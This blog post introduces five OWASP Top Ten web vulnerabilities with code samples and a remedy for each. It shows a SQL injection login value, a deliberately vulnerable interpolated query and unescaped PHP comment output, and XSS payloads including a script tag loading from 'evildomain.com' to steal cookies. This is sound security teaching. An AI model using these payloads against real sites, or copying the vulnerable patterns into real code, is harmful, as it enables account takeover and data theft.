---
title: OWASP Top Security Vulnerabilities
publishedAt: 2020-10-21 00:00:00
author: judah-t-anthony
image: /images/posts/owasp--top-security-vulnerabilities.png
tags: 
  - Security
  - SQL Injection
  - XSS Attack
  - Authentication
  - Authorization
source:
  name: Medium
  url: https://medium.com/codecademy-engineering/owasp-top-security-vulnerabilities-21bd36c171a8
---

In this day and age, as more and more of our lives are moving online, the importance of proper web application security is more pertinent than ever. Unfortunately, it can be a large and daunting topic that can leave engineers wondering where to even start.

If you are looking for a guide to introduce you to the most common web application attack vectors, the OWASP Top Ten is a great place to start.

> OWASP Top Ten
> The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad…
> [owasp.org](https://owasp.org/www-project-top-ten/)

The Open Web Application Security Project (OWASP) is a nonprofit that seeks to advocate and advance software security by hosting open events, developing training material, and sponsoring open source projects. One of those documents is the OWASP Top Ten.

The OWASP Top Ten is not the only guide and it is certainly not exhaustive, but it is broadly seen as the most essential. It outlines 10 of the most common security vulnerabilities, and it is a great place to start when building best practices or auditing your own systems.

Let’s take a look at some of them now.

## Injection

> Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.

![Bobby Drop Tables XKCD](/images/posts/1_P4nj9fJjSeJ9-c0rwSZqlg.webp "https://xkcd.com/327/")

The most well known variety of this is SQL injection. SQL injection occurs when, due to lack of escaping (formatting in order to retain the integrity of the data in a new context), data that was submitted by a user is partially or wholly interpreted as part of the structured query language and not as a variable within it.

Let’s say you have a login form that takes a username and password. The code that authenticates the user might look like:

```ruby
sql = "SELECT * FROM users WHERE username = '#{username}' AND password = '#{hash_password(password)}'"
user = con.query(sql).fetch_row
```

You can see here that the username and password are used to look up the user to authenticate them; however, what if a clever hacker used the value `admin'; --` for the username? That would produce a query like:

```ruby
SELECT * FROM users WHERE username = ‘admin'; -- ’ AND password = ‘0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33’
```

Notice how the single quote ends the username value and the semi-colon ends the query. What follows is a double dash; this comments out the rest of the line, reducing our query “where” statement to `username = 'admin'`. That is it; you have just handed the keys to the kingdom to any intrepid hacker with a little time on his/her hands.

Luckily, this is such a common vulnerability there are whole libraries built up around avoiding it. The safest solution is to use prepared statements for all SQL queries. So the above code would now look like:

```ruby
sql = "SELECT * FROM users WHERE username = ? AND password = ?;"
user = con.prepare(sql)
          .execute(username, hash_password(password))
          .fetch_row
```

In using a prepared statement, the parameters are completely separate from the actual structure of the query. [ORMs](https://en.wikipedia.org/wiki/Object-relational_mapping) (ie. [ActiveRecord](https://edgeguides.rubyonrails.org/active_record_basics.html) and [Hibernate](https://hibernate.org/orm/)) are another tool that can help by abstracting all interactions with the database, and giving you nice client syntax such as:

```ruby
User.find_by(username: username, password: hash_password(password))
```

## Cross-Site Scripting (XSS)

> XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.

![hacker among coders](/images/posts/1_dbIBAvjjuMgQ9jxY4kTyXg.webp "Icons made by Freepik from www.flaticon.com")

We have come a long way from when websites were just static pages with a little markup to improve the aesthetics of the document. Each web page is a mini application that can run code in powerful and sometimes dangerous ways. If a website takes untrusted user input for the purposes of displaying to other users, it is possible that it is opening itself up to XSS attacks.

Let’s say that you run your own blog, and in order to encourage the exchange of ideas you add the ability for users to post comments on an article. You may have a form where people can enter their name and a comment and that will be added to a database that later gets used to generate the page. At the bottom of the blog post page you add:

```php
<ul>
  <?php foreach ($comments as $c): ?>
    <li>
      <?= $c->name; ?><br />
      <?= $c->body; ?>
    </li>
  <?php endforeach; ?>
</ul>
```

The PHP syntax of `<?=` is a shorthand to output the raw value of the variable. This provides no output formatting, but assumes the value of the variable is itself valid HTML. If someone decided to post a comment that had the body of `I'm a harmless comment. <script src="http://evildomain.com/xss.js"></script>` , then whenever anyone else viewed the page, it would automatically request and execute whatever was in xss.js. This could be a malicious script to steal cookies or log passwords.

The answer, like the problem, is similar to the injection attack. Always make sure to escape the data; however, this can be more complex than one might initially assume.

For example, the naive approach would be to encode [special entities](https://developer.mozilla.org/en-US/docs/Glossary/Entity) like the less-than sign (<). Unfortunately, some WYSIWYGs will allow some small subset of HTML like underline, bold, and links. You could try to parse the text and format a small set of HTML that is deemed “safe”; however, be warned that sometimes it is tricky to identify what is “safe.”

Suppose you only allow users to provide links to useful content. What happens if the user submits a link like this.

```html
<a href="#" onhover="alert('XSS')">Click here</a>
```

This would allow the creator of the comment to execute code in the context of another user’s page. The malicious user could even set the style attribute to `display:fixed; top:0; left:0; width:100%; heigh:100%;` This would ensure the other user would hover over the link.

The general rule of thumb is all input should be validated (to ensure it “looks” like it should) and all output should be escaped/formatted (in a way appropriate to its use). How you escape a URL is different than how you escape for HTML which is different than how you escape for SQL which is different than how you escape for a CLI command.

Oh yeah, and like good encryption, never make up your escaping/filtering routines. Many people have put a lot of thought into this, and you don’t want to make those mistakes all over again.

## Broken Authentication

> Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.

![Firesheep](/images/posts/1_sv1vdGEuP6WivWogwMaJ8g.webp "http://ramasitahacking.blogspot.com/2015/11/hacking-facebook-using-firesheep-in.html")

We cannot discuss broken authentication without at least mentioning [Firesheep](https://codebutler.com/2010/10/24/firesheep/). Firesheep is one of the most visible and easily accessible examples of session hijacking. Session hijacking is one class of broken authentication where a malicious player can “log in” as any user by simply passively eavesdropping on the user’s network traffic, stealing their session cookie, and injecting it into their own browser traffic.

Firesheep did this by allowing a user to connect to an open (unencrypted) wifi network and providing them an easy and intuitive interface where they can list all the users on the network that are currently on Facebook and, with a click of the mouse, masquerade as that user.

This was possible because of a common practice early in the industry, where after logging in or signing up in a secure SSL encrypted connection, the site would flip the user back over to a normal unencrypted connection in order to save of the CPU cycles required to maintain the encrypted connection. The reasoning was the user was not transmitting anything sensitive like a password, so a normal HTTP connection was sufficient. However, this was lazy and untrue. The session cookie itself was a static, secret token that identified that user.

Luckily, we have a glut of computer power, ciphers in instruction sets, and [letsencrypt](https://letsencrypt.org/). This means quality TLS encryption has become nearly ubiquitous across all internet traffic.

That being said, we still should heed the lessons from our past. Always keep an eye out for what your exposure is and what your encryption guarantees are. For example, much of email is actually sent unencrypted, some server to server “intranet” traffic is sent unencrypted, and even the NSA has been caught [snooping](https://rt.com/usa/microsoft-nsa-snowden-leak-971/) on traffic pre/post encryption.

## Broken Access Control

> Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.

![thief coming in the window](/images/posts/1_rsMyuJzE9bUZ00utjR1A8Q.webp "https://www.123rf.com/photo_13590229_cartoon-scene-of-thief-break-into-house.html")

Broken access control is usually much more egregious, so often less common. This class of vulnerability is usually characterized by the ability to access more than the system intends due to some lack of authorization.

For example, there may be a banking website that properly requires you to log in, and upon logging in maintains your secure connection the whole time; however, as a curious, informed internet user you look at the location bar and notice something interesting. The path to the page includes your user id.

```
https://mybank.com/private/user/12345
```

You think to yourself, “if I’m user 12345, is there a user 12346”. So you replace the five with a six in the url, press enter, and lo and behold, you see another users banking information. In that moment, you did two things. You discovered a user enumeration flaw, and you committed a federal crime.

The key here is authentication and authorization are not the same things. Authentication is how you identify a user. Authorization is how you determine what that user should have access to.

A few tips to help you guard against this are:

* Always authorize every request. Whether through simple user ID associations or complex role based access control lists, know who your user is and what they have access to.
* Authorization on the client side is always just for user’s convenience. Every request should be authenticated on the server side.
* If a user does not have access to another user’s profile, don’t embed the user id in the url. Include the user id in the session that is established at authentication. In fact I’ll add, we as an industry should be moving toward unguessable UUIDs anytime we expose the ID outside the context of the inner-workings of an app. Integer based user IDs are a side effect of how your relational databases store that user, and it really should not be exposed beyond the database abstraction layer.

## Using Components with Known Vulnerabilities

> Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.

![illustration of a network](/images/posts/1_b2akbdgZiA7IpXdXjtWnUA.webp "https://neo4j.com/developer/tools-graph-visualization/")

Writing software is hard and complicated. One of the ways we have been able to accomplish what we have is by leveraging other people’s work through the use of open source. Open source is a great and terrible thing, and one should revere and fear it.

A recent and vivid example of this is the [event-stream](https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502) debacle. In this incident, a dependency of a dependency (yes really) was passed on to a new maintainer. This led to an exploit being secretly injected into the package that was target for the build system of a specific consumer. That consumer happened to be a crypto currency wallet app.

I’m not suggesting open source is bad or dangerous. On the contrary, though it was the fact that this was open source that created the vulnerability, it was also the fact that it was open source that it was found, disclosed, and fixed so quickly.

Ultimately, I would like to leave you with two recommendations. Due to the network affect of dependencies, we as engineers need to be careful about what we are including in our projects and how we are vetting them. This is a broad topic relating to dependency management, vendoring, vetting, and auditing. All I’ll say is, any code you import runs at the exact same privilege level as the code you so carefully craft and review, so ultimately you are responsible for its integrity and maintenance. I strongly recommend integrating [automated tools](https://dependabot.com/) to help you stay up to date with the latest versions.

Finally, software is not just a product; it is an endeavor and one conducted in the context of a community. The healthy of the community is just as important as any given feature that my be included in the library or framework. The community will have a huge impact on the documentation, support, direction, and overall longevity of a given project. So not only investigate the software, investigate the community that surrounds and supports it. And please, go further; support that community. That means contribute your time, money, code, and voice. Consider even joining a [cooperative](https://tidelift.com/) designed to support popular projects.

## And More

That is a look at five of the OWASP Top Ten security vulnerabilities. For completeness, the remaining five are:

* Sensitive Data Exposure
* XML External Entities (XXE)
* Security Misconfiguration
* Insecure Deserialization
* Insufficient Logging & Monitoring

If you would like to read about these or look more deeply into the former, I encourage you to go to [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/) and study them further.

## Finally

Knowing every nuance about application security can seem daunting, but if you have read this far, you have already taken the first and greatest step in securing your applications. The more you invest in yourself and your team the better your software will be. Don’t let security be an afterthought. Build it into your systems and processes. Many of the best mitigations amount to simple engineering best practices (eg. validation, formatting, scopes of trust, abstraction, updates/upgrades, etc).

Having read this you will have the insight needed to see and guard against most of the common web application vulnerabilities out there. The key now is what you do with that knowledge.
